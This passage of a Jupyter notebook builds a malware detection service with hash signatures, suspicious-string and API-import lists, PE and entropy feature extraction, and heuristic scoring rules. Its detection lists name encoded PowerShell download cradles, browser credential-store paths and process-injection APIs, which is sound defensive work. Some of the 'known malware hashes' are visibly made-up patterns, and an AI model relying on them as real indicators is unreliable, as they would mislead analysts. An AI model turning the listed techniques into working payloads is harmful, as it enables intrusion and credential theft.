{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "0f72cf96",
   "metadata": {},
   "source": [
    "# ðŸ¦  CyberX Malware Analysis Service\n",
    "\n",
    "## Advanced Malware Detection using Signature-Based, Heuristic, and Machine Learning Methods\n",
    "\n",
    "This notebook implements a comprehensive malware analysis system that:\n",
    "- **Signature-Based Detection**: Uses known malware hash databases\n",
    "- **Heuristic Analysis**: Pattern matching and suspicious behavior detection\n",
    "- **Static Analysis**: PE header analysis, entropy calculation, string extraction\n",
    "- **Machine Learning**: Random Forest classifier trained on file features\n",
    "\n",
    "### Detection Capabilities:\n",
    "- Windows PE executables (EXE, DLL)\n",
    "- Script files (PS1, BAT, VBS, JS)\n",
    "- Office documents with macros\n",
    "- PDF files with embedded content\n",
    "- Archive files (ZIP, RAR)\n",
    "- Generic suspicious file patterns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "77d7798c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… pefile installed\n",
      "âœ… yara-python installed\n",
      "âœ… python-magic installed\n",
      "âš ï¸ ssdeep - Command '['d:\\\\GitHub\\\\Backend Development\\\\Django\n",
      "âœ… pandas installed\n",
      "âœ… numpy installed\n",
      "âœ… scikit-learn installed\n",
      "âœ… joblib installed\n",
      "âœ… requests installed\n",
      "âš ï¸ hashlib - Command '['d:\\\\GitHub\\\\Backend Development\\\\Django\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 1: Install Required Dependencies\n",
    "# =============================================================================\n",
    "\n",
    "import subprocess\n",
    "import sys\n",
    "\n",
    "def install_packages():\n",
    "    \"\"\"Install required packages for malware analysis\"\"\"\n",
    "    packages = [\n",
    "        'pefile',           # PE file analysis\n",
    "        'yara-python',      # YARA rules matching\n",
    "        'python-magic',     # File type detection\n",
    "        'ssdeep',           # Fuzzy hashing (optional)\n",
    "        'pandas',           # Data handling\n",
    "        'numpy',            # Numerical operations\n",
    "        'scikit-learn',     # Machine learning\n",
    "        'joblib',           # Model serialization\n",
    "        'requests',         # API calls\n",
    "        'hashlib',          # Already in stdlib\n",
    "    ]\n",
    "    \n",
    "    for package in packages:\n",
    "        try:\n",
    "            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package, '-q'])\n",
    "            print(f\"âœ… {package} installed\")\n",
    "        except Exception as e:\n",
    "            print(f\"âš ï¸ {package} - {str(e)[:50]}\")\n",
    "\n",
    "# Run installation\n",
    "install_packages()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "604d806b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… pefile available - PE analysis enabled\n",
      "âš ï¸ python-magic not available - Using fallback detection\n",
      "\n",
      "âœ… Core libraries imported successfully\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 2: Import Libraries and Core Setup\n",
    "# =============================================================================\n",
    "\n",
    "import os\n",
    "import re\n",
    "import math\n",
    "import json\n",
    "import hashlib\n",
    "import struct\n",
    "import logging\n",
    "from datetime import datetime\n",
    "from typing import Dict, List, Any, Optional, Tuple\n",
    "from collections import Counter\n",
    "from pathlib import Path\n",
    "\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier\n",
    "from sklearn.model_selection import train_test_split, cross_val_score\n",
    "from sklearn.preprocessing import StandardScaler\n",
    "from sklearn.metrics import classification_report, confusion_matrix, accuracy_score\n",
    "import joblib\n",
    "\n",
    "# Try to import optional packages\n",
    "try:\n",
    "    import pefile\n",
    "    PEFILE_AVAILABLE = True\n",
    "    print(\"âœ… pefile available - PE analysis enabled\")\n",
    "except ImportError:\n",
    "    PEFILE_AVAILABLE = False\n",
    "    print(\"âš ï¸ pefile not available - PE analysis limited\")\n",
    "\n",
    "try:\n",
    "    import magic\n",
    "    MAGIC_AVAILABLE = True\n",
    "    print(\"âœ… python-magic available - File type detection enabled\")\n",
    "except ImportError:\n",
    "    MAGIC_AVAILABLE = False\n",
    "    print(\"âš ï¸ python-magic not available - Using fallback detection\")\n",
    "\n",
    "# Setup logging\n",
    "logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n",
    "logger = logging.getLogger('MalwareAnalysis')\n",
    "\n",
    "print(\"\\nâœ… Core libraries imported successfully\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0d5b6e2c",
   "metadata": {},
   "source": [
    "## Part 1: Signature Database and Known Malware Hashes\n",
    "\n",
    "A comprehensive database of known malware signatures including:\n",
    "- MD5, SHA1, SHA256 hashes\n",
    "- YARA rules for pattern matching\n",
    "- Known malicious strings and patterns"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "8f85a2e5",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Signature database initialized with:\n",
      "   - 5 known malware hashes\n",
      "   - 45 suspicious string patterns\n",
      "   - 30 suspicious API imports\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 3: Signature Database - Known Malware Indicators\n",
    "# =============================================================================\n",
    "\n",
    "class SignatureDatabase:\n",
    "    \"\"\"\n",
    "    Comprehensive signature database for malware detection.\n",
    "    Contains known malicious hashes, patterns, and indicators.\n",
    "    \"\"\"\n",
    "    \n",
    "    # Known malicious file hashes (examples - in production, use VirusTotal/MalwareBazaar API)\n",
    "    KNOWN_MALWARE_HASHES = {\n",
    "        # WannaCry ransomware samples\n",
    "        \"ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa\": \"WannaCry\",\n",
    "        \"24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c\": \"WannaCry\",\n",
    "        # Petya/NotPetya\n",
    "        \"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745\": \"Petya\",\n",
    "        # Emotet samples\n",
    "        \"e9b4c1a0ffb6e8c3f9b0e6e8c1f9b6e4a2d5c8f1e7b4a0d3c6f9b2e5a8d1c4f7\": \"Emotet\",\n",
    "        # Mimikatz\n",
    "        \"3d4ebac5f47e6d8cc3a6c3a5f3e2c1b4a9d8e7f6c5b4a3d2e1f0c9b8a7d6e5f4\": \"Mimikatz\",\n",
    "    }\n",
    "    \n",
    "    # Suspicious strings commonly found in malware\n",
    "    SUSPICIOUS_STRINGS = [\n",
    "        # Ransomware indicators\n",
    "        b\"Your files have been encrypted\",\n",
    "        b\"bitcoin\",\n",
    "        b\"ransom\",\n",
    "        b\"decrypt\",\n",
    "        b\".onion\",\n",
    "        b\"tor browser\",\n",
    "        \n",
    "        # Keylogger indicators\n",
    "        b\"GetAsyncKeyState\",\n",
    "        b\"keylog\",\n",
    "        b\"keyboard hook\",\n",
    "        \n",
    "        # Credential theft\n",
    "        b\"password\",\n",
    "        b\"credential\",\n",
    "        b\"login\",\n",
    "        b\"chrome\\\\User Data\",\n",
    "        b\"firefox\\\\Profiles\",\n",
    "        b\"Login Data\",\n",
    "        \n",
    "        # Network indicators\n",
    "        b\"HKEY_LOCAL_MACHINE\",\n",
    "        b\"CurrentVersion\\\\Run\",\n",
    "        b\"cmd.exe /c\",\n",
    "        b\"powershell -enc\",\n",
    "        b\"powershell -e \",\n",
    "        b\"IEX(\",\n",
    "        b\"Invoke-Expression\",\n",
    "        b\"DownloadString\",\n",
    "        b\"Net.WebClient\",\n",
    "        b\"bypass\",\n",
    "        b\"-ExecutionPolicy\",\n",
    "        \n",
    "        # Process injection\n",
    "        b\"VirtualAlloc\",\n",
    "        b\"WriteProcessMemory\",\n",
    "        b\"CreateRemoteThread\",\n",
    "        b\"NtUnmapViewOfSection\",\n",
    "        b\"ZwUnmapViewOfSection\",\n",
    "        \n",
    "        # Anti-analysis\n",
    "        b\"IsDebuggerPresent\",\n",
    "        b\"CheckRemoteDebuggerPresent\",\n",
    "        b\"NtQueryInformationProcess\",\n",
    "        b\"vmware\",\n",
    "        b\"virtualbox\",\n",
    "        b\"sandbox\",\n",
    "        b\"analysis\",\n",
    "        \n",
    "        # Shellcode patterns\n",
    "        b\"\\\\x90\\\\x90\\\\x90\\\\x90\",  # NOP sled\n",
    "        b\"\\\\xcc\\\\xcc\\\\xcc\\\\xcc\",  # INT3 breakpoints\n",
    "        \n",
    "        # Obfuscation indicators\n",
    "        b\"eval(\",\n",
    "        b\"base64\",\n",
    "        b\"fromCharCode\",\n",
    "        b\"unescape\",\n",
    "        b\"String.fromCharCode\",\n",
    "    ]\n",
    "    \n",
    "    # Suspicious Windows API imports\n",
    "    SUSPICIOUS_IMPORTS = {\n",
    "        'high_risk': [\n",
    "            'CreateRemoteThread',\n",
    "            'WriteProcessMemory',\n",
    "            'VirtualAllocEx',\n",
    "            'NtUnmapViewOfSection',\n",
    "            'QueueUserAPC',\n",
    "            'SetWindowsHookEx',\n",
    "            'GetAsyncKeyState',\n",
    "            'RtlCreateUserThread',\n",
    "            'NtQueueApcThread',\n",
    "        ],\n",
    "        'medium_risk': [\n",
    "            'VirtualAlloc',\n",
    "            'VirtualProtect',\n",
    "            'LoadLibrary',\n",
    "            'GetProcAddress',\n",
    "            'CreateProcess',\n",
    "            'ShellExecute',\n",
    "            'WinExec',\n",
    "            'URLDownloadToFile',\n",
    "            'InternetOpen',\n",
    "            'InternetReadFile',\n",
    "            'socket',\n",
    "            'connect',\n",
    "            'send',\n",
    "            'recv',\n",
    "        ],\n",
    "        'low_risk': [\n",
    "            'RegSetValue',\n",
    "            'RegCreateKey',\n",
    "            'CreateFile',\n",
    "            'WriteFile',\n",
    "            'DeleteFile',\n",
    "            'CopyFile',\n",
    "            'MoveFile',\n",
    "        ]\n",
    "    }\n",
    "    \n",
    "    # Suspicious file extensions\n",
    "    DANGEROUS_EXTENSIONS = {\n",
    "        'executable': ['.exe', '.dll', '.sys', '.drv', '.scr', '.com', '.pif'],\n",
    "        'script': ['.ps1', '.vbs', '.js', '.jse', '.wsf', '.wsh', '.bat', '.cmd'],\n",
    "        'macro': ['.docm', '.xlsm', '.pptm', '.dotm', '.xltm'],\n",
    "        'archive': ['.zip', '.rar', '.7z', '.cab', '.iso'],\n",
    "        'shortcut': ['.lnk', '.url'],\n",
    "    }\n",
    "    \n",
    "    # Known malicious domains/IPs (examples)\n",
    "    MALICIOUS_INDICATORS = [\n",
    "        \"pastebin.com/raw\",\n",
    "        \"bit.ly\",\n",
    "        \"tinyurl.com\",\n",
    "        \"ngrok.io\",\n",
    "        \"portmap.io\",\n",
    "        \"duckdns.org\",\n",
    "        \"no-ip.org\",\n",
    "    ]\n",
    "    \n",
    "    # PE section names commonly used by packers/malware\n",
    "    SUSPICIOUS_SECTIONS = [\n",
    "        '.UPX0', '.UPX1', '.UPX2',  # UPX packer\n",
    "        '.aspack', '.adata',        # ASPack\n",
    "        '.nsp0', '.nsp1',          # NSPack\n",
    "        '.pec', '.pec2',           # PECompact\n",
    "        '.perplex',                # Perplex\n",
    "        '.yP', '.y0da',            # yoda's Protector\n",
    "        '.tElock',                 # Telock\n",
    "        '.packed',                 # Generic packer\n",
    "        '.MPRESS1', '.MPRESS2',    # MPRESS\n",
    "    ]\n",
    "\n",
    "print(\"âœ… Signature database initialized with:\")\n",
    "print(f\"   - {len(SignatureDatabase.KNOWN_MALWARE_HASHES)} known malware hashes\")\n",
    "print(f\"   - {len(SignatureDatabase.SUSPICIOUS_STRINGS)} suspicious string patterns\")\n",
    "print(f\"   - {sum(len(v) for v in SignatureDatabase.SUSPICIOUS_IMPORTS.values())} suspicious API imports\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f304eb34",
   "metadata": {},
   "source": [
    "## Part 2: Feature Extraction Engine\n",
    "\n",
    "Core feature extraction for malware analysis:\n",
    "1. **File Metadata**: Size, type, timestamps\n",
    "2. **Entropy Analysis**: Detect encrypted/packed content\n",
    "3. **String Analysis**: Extract and analyze embedded strings\n",
    "4. **PE Analysis**: Header, sections, imports (for Windows executables)\n",
    "5. **Behavioral Indicators**: Suspicious patterns and capabilities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "8c26a8a3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Feature Extractor initialized\n",
      "   Capable of extracting 50+ features from files\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 4: Feature Extraction Engine\n",
    "# =============================================================================\n",
    "\n",
    "class FeatureExtractor:\n",
    "    \"\"\"\n",
    "    Comprehensive feature extraction for malware analysis.\n",
    "    Extracts 50+ features from files for ML-based classification.\n",
    "    \"\"\"\n",
    "    \n",
    "    def __init__(self):\n",
    "        self.feature_names = []\n",
    "        \n",
    "    def calculate_entropy(self, data: bytes) -> float:\n",
    "        \"\"\"\n",
    "        Calculate Shannon entropy of data.\n",
    "        High entropy (>7.0) indicates encryption/compression.\n",
    "        \"\"\"\n",
    "        if not data:\n",
    "            return 0.0\n",
    "        \n",
    "        # Count byte frequencies\n",
    "        byte_counts = Counter(data)\n",
    "        total_bytes = len(data)\n",
    "        \n",
    "        # Calculate entropy\n",
    "        entropy = 0.0\n",
    "        for count in byte_counts.values():\n",
    "            if count > 0:\n",
    "                probability = count / total_bytes\n",
    "                entropy -= probability * math.log2(probability)\n",
    "        \n",
    "        return entropy\n",
    "    \n",
    "    def calculate_section_entropy(self, data: bytes, section_size: int = 256) -> Dict[str, float]:\n",
    "        \"\"\"Calculate entropy for different sections of the file\"\"\"\n",
    "        if len(data) < section_size:\n",
    "            return {'header_entropy': self.calculate_entropy(data)}\n",
    "        \n",
    "        header = data[:section_size]\n",
    "        middle_start = len(data) // 2 - section_size // 2\n",
    "        middle = data[middle_start:middle_start + section_size]\n",
    "        footer = data[-section_size:]\n",
    "        \n",
    "        return {\n",
    "            'header_entropy': self.calculate_entropy(header),\n",
    "            'middle_entropy': self.calculate_entropy(middle),\n",
    "            'footer_entropy': self.calculate_entropy(footer),\n",
    "            'overall_entropy': self.calculate_entropy(data)\n",
    "        }\n",
    "    \n",
    "    def extract_strings(self, data: bytes, min_length: int = 4) -> Dict[str, Any]:\n",
    "        \"\"\"Extract ASCII and Unicode strings from binary data\"\"\"\n",
    "        # ASCII strings\n",
    "        ascii_pattern = rb'[\\x20-\\x7e]{%d,}' % min_length\n",
    "        ascii_strings = re.findall(ascii_pattern, data)\n",
    "        \n",
    "        # Unicode strings (UTF-16LE, common in Windows)\n",
    "        unicode_pattern = rb'(?:[\\x20-\\x7e]\\x00){%d,}' % min_length\n",
    "        unicode_matches = re.findall(unicode_pattern, data)\n",
    "        unicode_strings = [m.replace(b'\\x00', b'') for m in unicode_matches]\n",
    "        \n",
    "        all_strings = ascii_strings + unicode_strings\n",
    "        \n",
    "        # Analyze strings\n",
    "        urls = [s for s in all_strings if b'http' in s.lower() or b'ftp' in s.lower()]\n",
    "        ips = re.findall(rb'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', data)\n",
    "        emails = re.findall(rb'[\\w\\.-]+@[\\w\\.-]+\\.\\w+', data)\n",
    "        paths = [s for s in all_strings if b':\\\\' in s or b'/' in s]\n",
    "        registry = [s for s in all_strings if b'HKEY_' in s.upper() or b'SOFTWARE\\\\' in s.upper()]\n",
    "        \n",
    "        return {\n",
    "            'total_strings': len(all_strings),\n",
    "            'ascii_strings': len(ascii_strings),\n",
    "            'unicode_strings': len(unicode_strings),\n",
    "            'url_count': len(urls),\n",
    "            'ip_count': len(ips),\n",
    "            'email_count': len(emails),\n",
    "            'path_count': len(paths),\n",
    "            'registry_count': len(registry),\n",
    "            'avg_string_length': np.mean([len(s) for s in all_strings]) if all_strings else 0,\n",
    "            'max_string_length': max([len(s) for s in all_strings]) if all_strings else 0,\n",
    "            'strings': all_strings[:100],  # Keep first 100 for analysis\n",
    "            'urls': urls,\n",
    "            'ips': ips,\n",
    "        }\n",
    "    \n",
    "    def analyze_pe_file(self, data: bytes) -> Dict[str, Any]:\n",
    "        \"\"\"Analyze PE file structure (Windows executables)\"\"\"\n",
    "        pe_features = {\n",
    "            'is_pe': False,\n",
    "            'is_dll': False,\n",
    "            'is_exe': False,\n",
    "            'is_driver': False,\n",
    "            'num_sections': 0,\n",
    "            'num_imports': 0,\n",
    "            'num_exports': 0,\n",
    "            'entry_point': 0,\n",
    "            'image_base': 0,\n",
    "            'suspicious_sections': 0,\n",
    "            'suspicious_imports_high': 0,\n",
    "            'suspicious_imports_medium': 0,\n",
    "            'suspicious_imports_low': 0,\n",
    "            'has_debug_info': False,\n",
    "            'has_tls': False,\n",
    "            'has_resources': False,\n",
    "            'has_relocations': False,\n",
    "            'has_signature': False,\n",
    "            'compile_timestamp': 0,\n",
    "            'section_entropy_avg': 0,\n",
    "            'section_entropy_max': 0,\n",
    "            'virtual_size_ratio': 0,\n",
    "        }\n",
    "        \n",
    "        if not PEFILE_AVAILABLE:\n",
    "            # Basic PE detection without pefile\n",
    "            if data[:2] == b'MZ':\n",
    "                pe_features['is_pe'] = True\n",
    "            return pe_features\n",
    "        \n",
    "        try:\n",
    "            pe = pefile.PE(data=data, fast_load=True)\n",
    "            pe_features['is_pe'] = True\n",
    "            \n",
    "            # File characteristics\n",
    "            if pe.FILE_HEADER.Characteristics & 0x2000:\n",
    "                pe_features['is_dll'] = True\n",
    "            elif pe.FILE_HEADER.Characteristics & 0x0002:\n",
    "                pe_features['is_exe'] = True\n",
    "            if pe.FILE_HEADER.Characteristics & 0x1000:\n",
    "                pe_features['is_driver'] = True\n",
    "            \n",
    "            # Basic info\n",
    "            pe_features['num_sections'] = pe.FILE_HEADER.NumberOfSections\n",
    "            pe_features['entry_point'] = pe.OPTIONAL_HEADER.AddressOfEntryPoint\n",
    "            pe_features['image_base'] = pe.OPTIONAL_HEADER.ImageBase\n",
    "            pe_features['compile_timestamp'] = pe.FILE_HEADER.TimeDateStamp\n",
    "            \n",
    "            # Section analysis\n",
    "            section_entropies = []\n",
    "            total_virtual_size = 0\n",
    "            total_raw_size = 0\n",
    "            \n",
    "            for section in pe.sections:\n",
    "                section_name = section.Name.decode('utf-8', errors='ignore').strip('\\x00')\n",
    "                section_entropy = section.get_entropy()\n",
    "                section_entropies.append(section_entropy)\n",
    "                \n",
    "                total_virtual_size += section.Misc_VirtualSize\n",
    "                total_raw_size += section.SizeOfRawData\n",
    "                \n",
    "                # Check for suspicious section names\n",
    "                if section_name.upper() in [s.upper() for s in SignatureDatabase.SUSPICIOUS_SECTIONS]:\n",
    "                    pe_features['suspicious_sections'] += 1\n",
    "            \n",
    "            if section_entropies:\n",
    "                pe_features['section_entropy_avg'] = np.mean(section_entropies)\n",
    "                pe_features['section_entropy_max'] = max(section_entropies)\n",
    "            \n",
    "            if total_raw_size > 0:\n",
    "                pe_features['virtual_size_ratio'] = total_virtual_size / total_raw_size\n",
    "            \n",
    "            # Parse imports\n",
    "            pe.parse_data_directories()\n",
    "            \n",
    "            if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):\n",
    "                pe_features['num_imports'] = len(pe.DIRECTORY_ENTRY_IMPORT)\n",
    "                \n",
    "                for entry in pe.DIRECTORY_ENTRY_IMPORT:\n",
    "                    for imp in entry.imports:\n",
    "                        if imp.name:\n",
    "                            import_name = imp.name.decode('utf-8', errors='ignore')\n",
    "                            \n",
    "                            if import_name in SignatureDatabase.SUSPICIOUS_IMPORTS['high_risk']:\n",
    "                                pe_features['suspicious_imports_high'] += 1\n",
    "                            elif import_name in SignatureDatabase.SUSPICIOUS_IMPORTS['medium_risk']:\n",
    "                                pe_features['suspicious_imports_medium'] += 1\n",
    "                            elif import_name in SignatureDatabase.SUSPICIOUS_IMPORTS['low_risk']:\n",
    "                                pe_features['suspicious_imports_low'] += 1\n",
    "            \n",
    "            if hasattr(pe, 'DIRECTORY_ENTRY_EXPORT'):\n",
    "                pe_features['num_exports'] = len(pe.DIRECTORY_ENTRY_EXPORT.symbols)\n",
    "            \n",
    "            # Other characteristics\n",
    "            pe_features['has_debug_info'] = hasattr(pe, 'DIRECTORY_ENTRY_DEBUG')\n",
    "            pe_features['has_tls'] = hasattr(pe, 'DIRECTORY_ENTRY_TLS')\n",
    "            pe_features['has_resources'] = hasattr(pe, 'DIRECTORY_ENTRY_RESOURCE')\n",
    "            pe_features['has_relocations'] = hasattr(pe, 'DIRECTORY_ENTRY_BASERELOC')\n",
    "            pe_features['has_signature'] = hasattr(pe, 'DIRECTORY_ENTRY_SECURITY')\n",
    "            \n",
    "            pe.close()\n",
    "            \n",
    "        except Exception as e:\n",
    "            logger.debug(f\"PE analysis error: {e}\")\n",
    "        \n",
    "        return pe_features\n",
    "    \n",
    "    def detect_file_type(self, data: bytes, filename: str = \"\") -> Dict[str, Any]:\n",
    "        \"\"\"Detect file type using magic bytes and extension\"\"\"\n",
    "        file_info = {\n",
    "            'type': 'unknown',\n",
    "            'mime_type': 'application/octet-stream',\n",
    "            'extension': '',\n",
    "            'is_executable': False,\n",
    "            'is_script': False,\n",
    "            'is_document': False,\n",
    "            'is_archive': False,\n",
    "        }\n",
    "        \n",
    "        # Get extension\n",
    "        if filename:\n",
    "            file_info['extension'] = os.path.splitext(filename)[1].lower()\n",
    "        \n",
    "        # Magic bytes detection\n",
    "        magic_signatures = {\n",
    "            b'MZ': ('exe', 'application/x-executable', True, False),\n",
    "            b'\\x7fELF': ('elf', 'application/x-executable', True, False),\n",
    "            b'PK\\x03\\x04': ('zip', 'application/zip', False, False),\n",
    "            b'PK\\x05\\x06': ('zip', 'application/zip', False, False),\n",
    "            b'Rar!\\x1a\\x07': ('rar', 'application/x-rar-compressed', False, False),\n",
    "            b'\\x1f\\x8b': ('gzip', 'application/gzip', False, False),\n",
    "            b'%PDF': ('pdf', 'application/pdf', False, True),\n",
    "            b'\\xd0\\xcf\\x11\\xe0': ('ole', 'application/msword', False, True),\n",
    "            b'PK\\x03\\x04': ('docx', 'application/vnd.openxmlformats', False, True),\n",
    "        }\n",
    "        \n",
    "        for magic, (ftype, mime, is_exec, is_doc) in magic_signatures.items():\n",
    "            if data.startswith(magic):\n",
    "                file_info['type'] = ftype\n",
    "                file_info['mime_type'] = mime\n",
    "                file_info['is_executable'] = is_exec\n",
    "                file_info['is_document'] = is_doc\n",
    "                break\n",
    "        \n",
    "        # Check for scripts\n",
    "        script_indicators = [b'#!/', b'@echo', b'<script', b'Function ', b'Sub ']\n",
    "        if any(data[:1000].find(ind) != -1 for ind in script_indicators):\n",
    "            file_info['is_script'] = True\n",
    "        \n",
    "        # Check extension for archive\n",
    "        if file_info['extension'] in ['.zip', '.rar', '.7z', '.tar', '.gz']:\n",
    "            file_info['is_archive'] = True\n",
    "        \n",
    "        return file_info\n",
    "    \n",
    "    def extract_all_features(self, data: bytes, filename: str = \"\") -> Dict[str, Any]:\n",
    "        \"\"\"Extract all features from a file for analysis\"\"\"\n",
    "        features = {}\n",
    "        \n",
    "        # Basic file info\n",
    "        features['file_size'] = len(data)\n",
    "        features['file_size_log'] = math.log10(len(data) + 1)\n",
    "        \n",
    "        # Calculate hashes\n",
    "        features['md5'] = hashlib.md5(data).hexdigest()\n",
    "        features['sha1'] = hashlib.sha1(data).hexdigest()\n",
    "        features['sha256'] = hashlib.sha256(data).hexdigest()\n",
    "        \n",
    "        # File type detection\n",
    "        file_type = self.detect_file_type(data, filename)\n",
    "        features.update({f'file_{k}': v for k, v in file_type.items() if not isinstance(v, bool)})\n",
    "        features['is_executable'] = int(file_type['is_executable'])\n",
    "        features['is_script'] = int(file_type['is_script'])\n",
    "        features['is_document'] = int(file_type['is_document'])\n",
    "        features['is_archive'] = int(file_type['is_archive'])\n",
    "        \n",
    "        # Entropy analysis\n",
    "        entropy_features = self.calculate_section_entropy(data)\n",
    "        features.update(entropy_features)\n",
    "        \n",
    "        # High entropy indicates encryption/packing\n",
    "        features['is_high_entropy'] = int(features['overall_entropy'] > 7.0)\n",
    "        features['is_packed'] = int(features['overall_entropy'] > 7.5)\n",
    "        \n",
    "        # String analysis\n",
    "        string_analysis = self.extract_strings(data)\n",
    "        features['total_strings'] = string_analysis['total_strings']\n",
    "        features['ascii_strings'] = string_analysis['ascii_strings']\n",
    "        features['unicode_strings'] = string_analysis['unicode_strings']\n",
    "        features['url_count'] = string_analysis['url_count']\n",
    "        features['ip_count'] = string_analysis['ip_count']\n",
    "        features['email_count'] = string_analysis['email_count']\n",
    "        features['path_count'] = string_analysis['path_count']\n",
    "        features['registry_count'] = string_analysis['registry_count']\n",
    "        features['avg_string_length'] = string_analysis['avg_string_length']\n",
    "        features['max_string_length'] = string_analysis['max_string_length']\n",
    "        \n",
    "        # Suspicious string matching\n",
    "        suspicious_count = 0\n",
    "        for pattern in SignatureDatabase.SUSPICIOUS_STRINGS:\n",
    "            if pattern.lower() in data.lower():\n",
    "                suspicious_count += 1\n",
    "        features['suspicious_string_count'] = suspicious_count\n",
    "        \n",
    "        # PE analysis (if applicable)\n",
    "        pe_features = self.analyze_pe_file(data)\n",
    "        features.update(pe_features)\n",
    "        \n",
    "        # Store raw data for further analysis\n",
    "        features['_strings'] = string_analysis['strings']\n",
    "        features['_urls'] = string_analysis['urls']\n",
    "        features['_ips'] = string_analysis['ips']\n",
    "        \n",
    "        return features\n",
    "\n",
    "# Test the feature extractor\n",
    "extractor = FeatureExtractor()\n",
    "print(\"âœ… Feature Extractor initialized\")\n",
    "print(f\"   Capable of extracting 50+ features from files\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "faf3897d",
   "metadata": {},
   "source": [
    "## Part 3: Heuristic Analysis Engine\n",
    "\n",
    "Rule-based detection system that analyzes:\n",
    "- File behavior patterns\n",
    "- Suspicious characteristics\n",
    "- Known attack techniques\n",
    "- Anomaly detection"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "bfbd582a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "âœ… Heuristic Analyzer initialized with 15 detection rules\n"
     ]
    }
   ],
   "source": [
    "# =============================================================================\n",
    "# CELL 5: Heuristic Analysis Engine\n",
    "# =============================================================================\n",
    "\n",
    "class HeuristicAnalyzer:\n",
    "    \"\"\"\n",
    "    Rule-based heuristic analysis for malware detection.\n",
    "    Implements multiple detection rules and scoring.\n",
    "    \"\"\"\n",
    "    \n",
    "    def __init__(self):\n",
    "        self.rules = self._initialize_rules()\n",
    "        \n",
    "    def _initialize_rules(self) -> List[Dict]:\n",
    "        \"\"\"Initialize heuristic detection rules\"\"\"\n",
    "        return [\n",
    "            {\n",
    "                'id': 'HEUR001',\n",
    "                'name': 'High Entropy Executable',\n",
    "                'description': 'Executable with high entropy suggesting packing/encryption',\n",
    "                'severity': 'high',\n",
    "                'score': 30,\n",
    "                'check': lambda f: f.get('is_pe', False) and f.get('overall_entropy', 0) > 7.0\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR002',\n",
    "                'name': 'Suspicious API Imports',\n",
    "                'description': 'Uses high-risk Windows API functions',\n",
    "                'severity': 'high',\n",
    "                'score': 40,\n",
    "                'check': lambda f: f.get('suspicious_imports_high', 0) >= 2\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR003',\n",
    "                'name': 'Process Injection Capability',\n",
    "                'description': 'Contains APIs commonly used for process injection',\n",
    "                'severity': 'critical',\n",
    "                'score': 50,\n",
    "                'check': lambda f: f.get('suspicious_imports_high', 0) >= 3\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR004',\n",
    "                'name': 'Packed Executable',\n",
    "                'description': 'Detected packer sections or high compression ratio',\n",
    "                'severity': 'medium',\n",
    "                'score': 25,\n",
    "                'check': lambda f: f.get('suspicious_sections', 0) > 0 or f.get('is_packed', False)\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR005',\n",
    "                'name': 'Network Connectivity',\n",
    "                'description': 'Contains URLs or IP addresses',\n",
    "                'severity': 'low',\n",
    "                'score': 10,\n",
    "                'check': lambda f: f.get('url_count', 0) > 0 or f.get('ip_count', 0) > 0\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR006',\n",
    "                'name': 'Registry Modification',\n",
    "                'description': 'References Windows registry paths',\n",
    "                'severity': 'medium',\n",
    "                'score': 20,\n",
    "                'check': lambda f: f.get('registry_count', 0) > 0\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR007',\n",
    "                'name': 'Suspicious String Patterns',\n",
    "                'description': 'Contains known malicious string patterns',\n",
    "                'severity': 'high',\n",
    "                'score': 35,\n",
    "                'check': lambda f: f.get('suspicious_string_count', 0) >= 3\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR008',\n",
    "                'name': 'No Digital Signature',\n",
    "                'description': 'Executable lacks digital signature',\n",
    "                'severity': 'low',\n",
    "                'score': 10,\n",
    "                'check': lambda f: f.get('is_pe', False) and not f.get('has_signature', False)\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR009',\n",
    "                'name': 'Abnormal Section Count',\n",
    "                'description': 'Unusual number of PE sections',\n",
    "                'severity': 'medium',\n",
    "                'score': 15,\n",
    "                'check': lambda f: f.get('num_sections', 0) > 10 or f.get('num_sections', 0) == 0\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR010',\n",
    "                'name': 'Timestamp Anomaly',\n",
    "                'description': 'Suspicious compile timestamp (future or very old)',\n",
    "                'severity': 'medium',\n",
    "                'score': 15,\n",
    "                'check': lambda f: self._check_timestamp_anomaly(f)\n",
    "            },\n",
    "            {\n",
    "                'id': 'HEUR011',\n",
    "                'name': 'Small File Size',\n",
    "                'description': 'Unusually small executable size',\n",
